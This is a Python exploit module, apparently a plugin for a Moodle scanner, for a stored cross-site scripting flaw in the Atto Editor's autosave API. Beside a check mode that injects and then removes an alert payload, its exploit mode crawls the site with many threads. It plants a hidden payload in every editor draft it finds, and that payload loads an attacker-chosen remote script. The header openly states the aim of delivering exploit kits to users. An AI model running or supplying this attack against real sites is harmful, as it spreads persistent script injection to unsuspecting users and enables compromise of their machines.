'''
@Title:
Atto Editor Stored XSS

@Author:
cyberaz0r

@Description:
It is possible to inject arbitrary Javascript code inside any draft of the Moodle Atto Editor by abusing the autosave functionality.
Once saved, on the next loading of the page that contains the draft the code will be retrieved by the Atto Editor draft restore API, written inside the textarea element and executed by the browser.
This allows an attacker who already compromised an user's Moodle account to escalate into greater goals, such as compromising the user's machine by embedding exploit kits inside Moodle, making Moodle a threat actor for the user's total compromise.
'''


enabled = True


import requests

from json import loads
from gc import collect
from threading import Thread
from bs4 import BeautifulSoup

# global vars
base_url = ''
pages = []
found = False

# suppress requests insecure warning
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


# implementation of the Thread class with return value
class ThreadReturn(Thread):
	def __init__(self, group=None, target=None, name=None, args=(), kwargs={}, Verbose=None):
		Thread.__init__(self, group, target, name, args, kwargs)
		self._return = None
	
	def run(self):
		if self._target is not None:
			self._return = self._target(*self._args, **self._kwargs)
	
	def join(self, *args):
		Thread.join(self, *args)
		return self._return


# parse Moodle links from an HTML page
def scrape(parent_url, sess, payload, verbose, check_mode=False):
	global pages, found
	
	# avoid scraping off-scope/non-php links or accidentally logging out
	filename = parent_url.split('?', 1)[0]
	if filename.endswith('logout.php') or (filename != base_url and not filename.endswith('/') and not filename.endswith('.php')): return []
	
	if verbose > 2:
		print('[i] Scraper: scraping links from "{}"'.format(parent_url))
	
	# get page content
	content = sess.get(parent_url).text
	links = []
	
	# check for an Atto Editor element in page content and try to inject payload into it
	if '"pageHash":"' in content:
		print('[*] Atto Editor found on "{}", injecting payload...'.format(parent_url))
		injection = inject(content, sess, payload, check_mode)
		
		# if in check mode, scraping can stop and result of injection is returned
		if check_mode:
			found = True
			return injection
	
	# append page url to list
	pages.append(parent_url)
	
	# parse all links from content
	for url in BeautifulSoup(content, 'html.parser').find_all('a'):
		try:
			links.append(url['href'])
		except:
			pass
	
	# remove off-scope or duplicate links
	links = [x for x in links if x.startswith(base_url) and x != base_url and x != base_url + '/']
	links = list(dict.fromkeys(links))
	
	return links


# inject payload inside Atto Editor element
def inject(content, sess, payload, check_mode):
	# initialize vars
	try:
		sesskey = content.split('"sesskey":"')[1].split('"')[0]
		pagehash = content.split('"pageHash":"')[1].split('"')[0]
		contextid = content.split('"contextid":')[1].split(',')[0]
		elementid = content.split('"elementid":"')[1].split('"')[0]
		draftid = content.split('"itemid":')[1].split('}')[0]
	except IndexError:
		print('[X] Error retrieving Atto Editor element')
		return False
	
	# first request: initialize draft or restore previous
	sess.post(
		base_url + '/lib/editor/atto/autosave-ajax.php',
		data = {
			'actions[0][contextid]' : contextid,
			'actions[0][action]' : 'resume',
			'actions[0][draftid]' : draftid,
			'actions[0][elementid]' : elementid,
			'actions[0][pageinstance]' : '',
			'actions[0][pagehash]' : pagehash,
			'sesskey' : sesskey
		},
		headers = {
			'X-Requested-With' : 'XMLHttpRequest'
		}
	)
	
	# second request: inject payload to draft
	inject = sess.post(
		base_url + '/lib/editor/atto/autosave-ajax.php',
		data = {
			'actions[0][sesskey]' : sesskey,
			'actions[0][contextid]' : contextid,
			'actions[0][action]' : 'save',
			'actions[0][drafttext]' : payload,
			'actions[0][elementid]' : elementid,
			'actions[0][pagehash]' : pagehash,
			'actions[0][pageinstance]' : '',
			'sesskey' : sesskey
		},
		headers = {
			'X-Requested-With' : 'XMLHttpRequest'
		}
	)
	
	if inject.status_code != 200 or inject.text != '[null]':
		print('[X] Error injecting payload')
		return False
	
	# third request: retrieve draft and check if the payload has been injected successfully
	res = sess.post(
		base_url + '/lib/editor/atto/autosave-ajax.php',
		data = {
			'actions[0][contextid]' : contextid,
			'actions[0][action]' : 'resume',
			'actions[0][draftid]' : draftid,
			'actions[0][elementid]' : elementid,
			'actions[0][pageinstance]' : '',
			'actions[0][pagehash]' : pagehash,
			'sesskey' : sesskey
		},
		headers = {
			'X-Requested-With' : 'XMLHttpRequest'
		}
	)
	
	# if the payload is found in the restored draft, it has been injected successfully
	if res.status_code != 200 or loads(res.text)[0]['result'] != payload:
		print('[X] Payload not injected correctly')
		return False
	
	print('[+] Payload injected correctly')
	
	# if in check mode remove payload from draft
	if check_mode:
		sess.post(
			base_url + '/lib/editor/atto/autosave-ajax.php',
			data = {
				'actions[0][sesskey]' : sesskey,
				'actions[0][contextid]' : contextid,
				'actions[0][action]' : 'reset',
				'actions[0][elementid]' : elementid,
				'actions[0][pagehash]' : pagehash,
				'actions[0][pageinstance]' : '',
				'sesskey' : sesskey
			},
			headers = {
				'X-Requested-With' : 'XMLHttpRequest'
			}
		)
		
		print('[+] Removed payload from draft')
	
	return True


# perform a quick check if an Atto Editor element is on user profile edit page, with no scraping necessary
def quick_check(sess, payload):
	print('[*] Trying to retrieve Atto Editor element from user profile edit page')
	
	content = sess.get(base_url+'/user/edit.php').text
	if '"pageHash":"' not in content:
		print('[-] Atto Editor element not found in user profile edit page')
		return False
	
	print('[*] Atto Editor found on user profile edit page, injecting payload...')
	return inject(content, sess, payload, True)

# check mode: try to inject payload in a draft just once and then reset it
def check(args, sess, version):
	global base_url
	
	if args.auth is None:
		print('[-] Vulnerability "{}" requires authentication, skipping...'.format(__name__.split('.', 1)[1]))
		return False
	
	base_url = args.url
	payload = '<img src=x onerror="alert(\'vulnerable!\')">'
	
	# trying to inject payload in an Atto Editor element on user profile edit page, scrape for other Atto Editor elements otherwhise
	if quick_check(sess, payload):
		return True
	
	# single-threaded scraping to avoid invasive traffic and handle results better
	print('[*] Finding an Atto Editor element on "{}"'.format(args.url))
	links = scrape(args.url, sess, payload, args.verbose, True)
	
	# extract links from pages content until there are none left
	while True:
		spool = [scrape(link, sess, payload, args.verbose, True) for link in links if not found]
		
		if found:
			return spool[-1]
		
		# sorting links and removing duplicates
		spool = [y for x in spool for y in x]
		spool = list(dict.fromkeys(spool))
		spool = [x for x in spool if x not in pages]
		
		if not spool:
			break
			
		links = spool
		
		# clean memory
		collect()
	
	print('[-] No Atto Editor element was found')
	return False

# exploit mode: multi-threaded scrape for any injectable Atto Editor element in moodle and save payload into it
def exploit(args, sess, version):
	global base_url
	
	base_url = args.url
	
	nthreads = input('[?] Insert number of threads used for exploiting the vulnerability or press Enter for default value (10): ')
	nthreads = (10 if not nthreads else int(nthreads))
	
	script_url = input('[?] Insert URL of the script that has to be executed in the XSS payload: ')
	payload = '<img src=x style="display:none" onerror="var s=document.createElement(\'script\'); s.src=\'{}\'; document.body.appendChild(s);">'.format(script_url)
	
	# multi-threaded scraping for improving performance in exploitation mode
	print('[*] Scraping Moodle on "{}"'.format(args.url))
	links = scrape(args.url, sess, payload, args.verbose)
	
	
	# extract links from pages content until there are none left
	while True:
		spool = []
		spool2 = []
		
		# using a spool variable to save scraping result from every thread and another one for feeding multithreaded functions
		for link in links:
			if len(spool2) < nthreads and len(links) != len(spool2) + 1:
				spool2.append(link)
				continue
			
			threads = [ThreadReturn(target = scrape, args = (x, sess, payload, args.verbose)) for x in spool2]
			for thread in threads: thread.start()
			for thread in threads: spool += thread.join()
			
			spool2 = []
		
		# sorting links and removing duplicates
		spool = [x for x in spool]
		spool = list(dict.fromkeys(spool))
		spool = [x for x in spool if x not in pages]
		
		if not spool:
			break
		
		links = spool
		
		# clean memory
		del spool
		del spool2
		
		collect()
	
	print('[+] Moodle scraping complete')
